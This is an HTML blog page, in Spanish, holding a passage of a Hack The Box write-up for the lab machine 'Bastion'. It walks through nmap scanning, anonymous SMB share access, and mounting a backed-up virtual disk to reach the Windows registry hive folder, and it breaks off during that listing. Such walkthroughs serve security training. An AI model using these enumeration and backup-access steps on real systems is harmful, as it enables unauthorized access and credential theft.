@@ -1,0 +1,1037 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Bastion - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Bastion en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Bastion">
+<meta property="og:url" content="http://localhost:4000/htb-bastion/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Bastion en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-bastion/bastion.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-18T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-bastion/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Bastion</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Bastion">
+    <meta itemprop="description" content="Resolución de la máquina Bastion en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="March 18, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Bastion
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-18T00:00:00-06:00">March 18, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-bastion/banner-bastion.jpg" alt=""></p>
+
+<h2 id="bastion">Bastion</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.134.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.134
+PING 10.10.10.134 <span class="o">(</span>10.10.10.134<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.134: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>137 ms
+
+<span class="nt">---</span> 10.10.10.134 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.525/136.525/136.525/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.134 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-18 16:24 CST
+Initiating SYN Stealth Scan at 16:24
+Scanning 10.10.10.134 <span class="o">[</span>65535 ports]
+Discovered open port 139/tcp on 10.10.10.134
+Discovered open port 135/tcp on 10.10.10.134
+Discovered open port 445/tcp on 10.10.10.134
+Discovered open port 22/tcp on 10.10.10.134
+Discovered open port 49667/tcp on 10.10.10.134
+Discovered open port 49670/tcp on 10.10.10.134
+Discovered open port 47001/tcp on 10.10.10.134
+Discovered open port 49668/tcp on 10.10.10.134
+Discovered open port 49669/tcp on 10.10.10.134
+Discovered open port 49664/tcp on 10.10.10.134
+Discovered open port 5985/tcp on 10.10.10.134
+Discovered open port 49666/tcp on 10.10.10.134
+Discovered open port 49665/tcp on 10.10.10.134
+Completed SYN Stealth Scan at 16:24, 14.21s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.134
+Host is up, received user-set <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-03-18 16:24:07 CST <span class="k">for </span>14s
+Not shown: 65522 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE      REASON
+22/tcp    open  ssh          syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+49670/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.31 seconds
+           Raw packets sent: 69080 <span class="o">(</span>3.040MB<span class="o">)</span> | Rcvd: 68945 <span class="o">(</span>2.758MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 179 B
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.134
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.134 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-18 16:25 CST
+Nmap scan report <span class="k">for </span>10.10.10.134                                                                                                
+Host is up <span class="o">(</span>0.13s latency<span class="o">)</span><span class="nb">.</span>
+                                                                
+PORT      STATE SERVICE      VERSION                           
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:                                                  
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a <span class="o">(</span>RSA<span class="o">)</span>
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                  
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 <span class="o">(</span>ED25519<span class="o">)</span>   
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0       
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0       
+|_http-title: Not Found                                         
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC                                                                               
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-03-18T22:26:13
+|_  start_date: 2022-03-18T22:22:59
+|_clock-skew: mean: <span class="nt">-20m00s</span>, deviation: 34m35s, median: <span class="nt">-2s</span>
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2022-03-18T23:26:15+01:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>68.59 seconds
+</code></pre></div></div>
+
+<p>Vemos el puerto 445 abierto, por lo tanto vamos a tratar de conectarnos a través de una <strong><em>Null Session</em></strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.134 <span class="nt">-N</span>
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        Backups         Disk      
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+SMB1 disabled <span class="nt">--</span> no workgroup available
+❯ smbmap <span class="nt">-H</span> 10.10.10.134 <span class="nt">-u</span> <span class="s1">'null'</span>
+<span class="o">[</span>+] Guest session       IP: 10.10.10.134:445    Name: 10.10.10.134                                      
+<span class="o">[</span>/] Work[!] Unable to remove <span class="nb">test </span>directory at <span class="se">\\</span>10.10.10.134<span class="se">\B</span>ackups<span class="se">\Z</span>ETQPDWRLG, please remove manually
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        Backups                                                 READ, WRITE
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        IPC<span class="nv">$ </span>                                                   READ ONLY       Remote IPC
+</code></pre></div></div>
+
+<p>Vemos que podemos acceder al recurso <code class="language-plaintext highlighter-rouge">Backups</code> y tenemos permisos de lectura y escritura; por lo tanto vamos ingresar a dicho recurso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.10.134/Backups <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Fri Mar 18 21:18:35 2022
+  ..                                  D        0  Fri Mar 18 21:18:35 2022
+  note.txt                           AR      116  Tue Apr 16 05:10:09 2019
+  SDT65CB.tmp                         A        0  Fri Feb 22 06:43:08 2019
+  WindowsImageBackup                 Dn        0  Fri Feb 22 06:44:02 2019
+  ZETQPDWRLG                          D        0  Fri Mar 18 21:18:35 2022
+
+                5638911 blocks of size 4096. 1179128 blocks available
+
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Para trabajar más cómodos, vamos a crearnos una montura del recurso <code class="language-plaintext highlighter-rouge">backups</code> en nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/smbmounted
+❯ mount <span class="nt">-t</span> cifs //10.10.10.134/backups /mnt/smbmounted/ <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>null,password<span class="o">=</span>null,domain<span class="o">=</span>WORKGROUP,rw
+❯ <span class="nb">cd</span> /mnt/smbmounted
+❯ tree
+<span class="nb">.</span>
+├── note.txt
+├── SDT65CB.tmp
+├── WindowsImageBackup
+│   └── L4mpje-PC
+│       ├── Backup 2019-02-22 124351
+│       │   ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+│       │   ├── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+│       │   ├── BackupSpecs.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+│       │   ├── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+│       │   └── cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+│       ├── Catalog
+│       │   ├── BackupGlobalCatalog
+│       │   └── GlobalCatalog
+│       ├── MediaId
+│       └── SPPMetadataCache
+│           └── <span class="o">{</span>cd113385-65ff-4ea2-8ced-5630f6feca8f<span class="o">}</span>
+└── ZETQPDWRLG
+
+6 directories, 19 files
+</code></pre></div></div>
+
+<p>Vamos a descargarnos a nuestra máquina el archivo <code class="language-plaintext highlighter-rouge">note.txt</code> por si existe una pista que nos ayude.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /mnt/smbmounted/note.txt <span class="nb">.</span>
+❯ <span class="nb">cat </span>note.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: note.txt
+       │ Size: 116 B
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ Sysadmins: please don<span class="s1">'t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
+   3   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></code></pre></div></div>
+
+<p>La nota nos indica que no descarguemos el backup debido a que la VPN va lenta. Esta pista nos indica que igual y no deberíamos descargar los archivos de extensión <code class="language-plaintext highlighter-rouge">.vhd</code> que se encuentran bajo la ruta <code class="language-plaintext highlighter-rouge">WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351</code>;  ya que hay uno que pesa 5.0 GB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span> <span class="nt">-l</span> /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup<span class="se">\ </span>2019-02-22<span class="se">\ </span>124351
+.rwxr-xr-x root root  36 MB Fri Feb 22 06:44:03 2019  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
+.rwxr-xr-x root root 5.0 GB Fri Feb 22 06:45:32 2019  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+.rwxr-xr-x root root 1.2 KB Fri Feb 22 06:45:32 2019  BackupSpecs.xml
+.rwxr-xr-x root root 1.1 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
+.rwxr-xr-x root root 8.7 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
+.rwxr-xr-x root root 6.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
+.rwxr-xr-x root root 2.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
+.rwxr-xr-x root root 1.5 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
+.rwxr-xr-x root root 1.4 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
+.rwxr-xr-x root root 3.8 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
+.rwxr-xr-x root root 3.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
+.rwxr-xr-x root root 6.9 KB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
+.rwxr-xr-x root root 2.3 MB Fri Feb 22 06:45:32 2019  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
+</code></pre></div></div>
+
+<p>Por lo tanto, vamos a instalarnos la herramienta <code class="language-plaintext highlighter-rouge">qemu-utils</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ apt-get <span class="nb">install </span>qemu-utils <span class="nt">-y</span>
+</code></pre></div></div>
+
+<p>Ahora, nos situamos en la ruta <code class="language-plaintext highlighter-rouge">/mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351</code> y cargamos un módulo de kernel:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> /mnt/smbmounted/WindowsImageBackup/L4mpje-PC/Backup<span class="se">\ </span>2019-02-22<span class="se">\ </span>124351
+❯ rmmod nbd
+rmmod: ERROR: Module nbd is not currently loaded
+</code></pre></div></div>
+
+<p>Vemos que es necesario cargar el módulo <strong>nbd</strong>, por lo que ejecutamos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ modprobe nbd <span class="nv">max_part</span><span class="o">=</span>16
+❯ <span class="nb">ls</span> <span class="nt">-l</span> /dev | <span class="nb">grep </span>nbd
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd0
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd1
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd10
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd11
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd12
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd13
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd14
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd15
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd2
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd3
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd4
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd5
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd6
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd7
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd8
+brw-rw---- root disk      0 B  Fri Mar 18 21:51:50 2022 nbd9
+❯ rmmod nbd
+</code></pre></div></div>
+
+<p>Ahora si ya nos acepta el comando y luego ejecutamos lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ qemu-nbd <span class="nt">-c</span> /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+qemu-nbd: Failed to open /dev/nbd0: No such file or directory
+qemu-nbd: Disconnect client, due to: Failed to <span class="nb">read </span>request: Unexpected end-of-file before all bytes were <span class="nb">read</span>
+</code></pre></div></div>
+
+<p>En caso de que nos salga este error, volvemos a ejecutar <code class="language-plaintext highlighter-rouge">modprobe nbd max_part=16</code> y otra vez <code class="language-plaintext highlighter-rouge">qemu-nbd -c /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</code> en donde el archivo <code class="language-plaintext highlighter-rouge">vhd</code> (<strong><em>Virtual Hard Disk</em></strong>) corresponde al más grande, es decir, el que pesa 5.0 GB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ modprobe nbd <span class="nv">max_part</span><span class="o">=</span>16
+❯ qemu-nbd <span class="nt">-c</span> /dev/nbd0 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+</code></pre></div></div>
+
+<p>Ahora vamos a crearnos una montura del disco que lo tenemos en  <code class="language-plaintext highlighter-rouge">/dev/nbd0</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/Bastion
+❯ mount /dev/nbd0p1 /mnt/Bastion
+</code></pre></div></div>
+
+<p>Debemos de tener el disco virtual montado bajo <code class="language-plaintext highlighter-rouge">/mnt/Bastion</code>, vamos a comprobarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> /mnt/Bastion
+❯ ll
+drwxrwxrwx root root   0 B  Fri Feb 22 06:39:26 2019  <span class="nv">$Recycle</span>.Bin
+lrwxrwxrwx root root  18 B  Mon Jul 13 23:53:55 2009  Documents and Settings ⇒ /mnt/Bastion/Users
+drwxrwxrwx root root   0 B  Mon Jul 13 21:37:05 2009  PerfLogs
+drwxrwxrwx root root 4.0 KB Mon Apr 11 21:21:18 2011  Program Files
+drwxrwxrwx root root 4.0 KB Mon Jul 13 23:53:55 2009  ProgramData
+drwxrwxrwx root root   0 B  Fri Feb 22 06:39:17 2019  Recovery
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:43:53 2019  System Volume Information
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:39:21 2019  Users
+drwxrwxrwx root root  16 KB Fri Feb 22 06:40:48 2019  Windows
+.rwxrwxrwx root root  24 B  Wed Jun 10 16:42:20 2009  autoexec.bat
+.rwxrwxrwx root root  10 B  Wed Jun 10 16:42:20 2009  config.sys
+.rwxrwxrwx root root 2.0 GB Fri Feb 22 06:38:21 2019  pagefile.sys
+</code></pre></div></div>
+
+<p>Tenemos una estructura de directorios de Windows; así que vamos a dirigirnos a la ruta <code class="language-plaintext highlighter-rouge">Windows/System32/config</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd </span>Windows/System32/config
+❯ ll
+drwxrwxrwx root root   0 B  Mon Jul 13 21:04:23 2009  Journal
+drwxrwxrwx root root   0 B  Fri Feb 22 06:37:28 2019  RegBack
+drwxrwxrwx root root 4.0 KB Sat Nov 20 14:48:09 2010  systemprofile
+drwxrwxrwx root root 4.0 KB Fri Feb 22 06:38:05 2019  TxR
+.rwxrwxrwx root root  28 KB Fri Feb 22 15:37:05 2019  BCD-Template
+.rwxrwxrwx root root  25 KB Fri Feb 22 15:37:05 2019  BCD-Template.LOG
+.rwxrwxrwx root root  30 MB Fri Feb 22 06:43:54 2019  COMPONENTS
+.rwxrwxrwx root root 1.0 KB Mon Apr 11 21:23:54 2011  COMPONENTS.LOG
+.rwxrwxrwx root root 256 KB Fri Feb 22 06:43:54 2019  COMPONENTS.LOG1
+.rwxrwxrwx root root   0 B  Mon Jul 13 21:03:40 2009  COMPONENTS.LOG2
